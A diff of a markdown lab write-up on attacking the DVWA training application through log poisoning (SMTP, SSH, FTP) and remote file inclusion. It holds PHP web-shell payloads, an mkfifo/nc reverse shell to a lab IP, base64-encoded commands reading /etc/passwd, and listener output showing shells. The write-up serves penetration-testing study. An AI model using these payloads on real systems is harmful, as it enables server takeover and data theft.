@@ -268,7 +268,9 @@ www-data
 ------
 
 ### Log poisoning smtp
+To configure smtp service, you can guide yourself from this [article](https://www.hackingarticles.in/smtp-pentest-lab-setup-ubuntu/).
 
+If we scan our equipment we will see how the smtp service is running.
 
 ```
 ❯ nmap localhost
@@ -284,8 +286,11 @@ PORT     STATE SERVICE
 8080/tcp open  http-proxy
 ```
 
+We view the log file from the browser.
 
-Smtp poisoning
+![smtplog](/assets/imgs/dvwa2/smtplog.png)
+
+We poison the smtp service.
 
 ```
 ❯ nc localhost 25                                   
@@ -295,6 +300,11 @@ MAIL FROM:<test@test.com>
 RCPT TO:<?php system($_GET['cmd']); ?>              
 501 5.1.3 Bad recipient address syntax              
 ```
+
+We intercept with burp and add our malicious command.
+
+![burpsmtp](/assets/imgs/dvwa2/burpsmtp.png)
+
 
 Obtain shell.
 
@@ -308,19 +318,40 @@ www-data
 ```
 
 ## RFI
+is an attack targeting vulnerabilities in web applications that dynamically reference external scripts. The perpetrator's goal is to take advantage of the referrer function in an application to load malware from a remote URL located within a different domain. [source](https://www.imperva.com/learn/application-security/rfi-remote-file-inclusion/)
+
+Including the remote domain from google to the dvwa application.
 
 ![rfi](/assets/imgs/dvwa2/rfi.png)
 
+Running remote code in php.
+
+```
+//Script from my local machine
+<?
+    phpinfo();
+?>
+```
+
 ![phpinfo](/assets/imgs/dvwa2/phpinfo.png)
 
-![shell](/assets/imgs/dvwa2/shell.png)
 
-### shell.php
+Reverse shell
+
+I create a script to get a shell and open a python server to point to my script ```shell.php```.
+
+```
 <?php
 
     passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.105 4444 >/tmp/f");
 ?>
+```
 
+
+![shell](/assets/imgs/dvwa2/shell.png)
+
+
+```
 ## SHELL
 ❯ python -m SimpleHTTPServer
 Serving HTTP on 0.0.0.0 port 8000 ...
@@ -333,58 +364,4 @@ connect to [192.168.0.105] from (UNKNOWN) [192.168.0.105] 59934
 /bin/sh: 0: can't access tty; job control turned off
 $ whoami
 www-data
-
-------------------------------------------------------
-## SHELL LFI APACHE
-❯ nc -lvnp 4444
-listening on [any] 4444 ...
-connect to [192.168.0.105] from (UNKNOWN) [192.168.0.105] 60212
-bash: cannot set terminal process group (35990): Inappropriate ioctl for device
-bash: no job control in this shell
-www-data@debiantano:/var/www/html/dvwa/vulnerabilities/fi$ whoami
-whoami
-www-data
-www-data@debiantano:/var/www/html/dvwa/vulnerabilities/fi$
-
-
-
--------------------------
-# LOG POISONINF SSH
-
-ssh "<?php system('echo Y2F0IC9ldGMvcGFzc3dkCg==|base64 -d|bash'); ?>"@192.168.0.105
-
-NO FDUNCIONA
-❯ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.105 4444 >/tmp/f"|base64 -w0;echo
-cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4wLjEwNSA0NDQ0ID4vdG1wL2YK
-
-
-
-------------------------------
-## log poisoning ftp
-
-
-
-SHELL
-❯ ftp 192.168.0.105
-Connected to 192.168.0.105.
-220 (vsFTPd 3.0.3)
-Name (192.168.0.105:noroot): '<?php system($_GET['c']); ?>'
-331 Please specify the password.
-Password:
-530 Login incorrect.
-Login failed.
-ftp>
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-❯ nc -lvnp 4444
-listening on [any] 4444 ...
-connect to [192.168.0.105] from (UNKNOWN) [192.168.0.105] 43426
-/bin/sh: 0: can't access tty; job control turned off
-$ whoami
-www-data
-$
-
-
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-❯ tail -f vsftpd.log
-Fri Aug 20 01:55:53 2021 [pid 117912] CONNECT: Client "::ffff:192.168.0.105"
-Fri Aug 20 01:56:04 2021 [pid 117911] ['<?php system($_GET['c']); ?>'] FAIL LOGIN: Client "::ffff:192.168.0.105"
+```
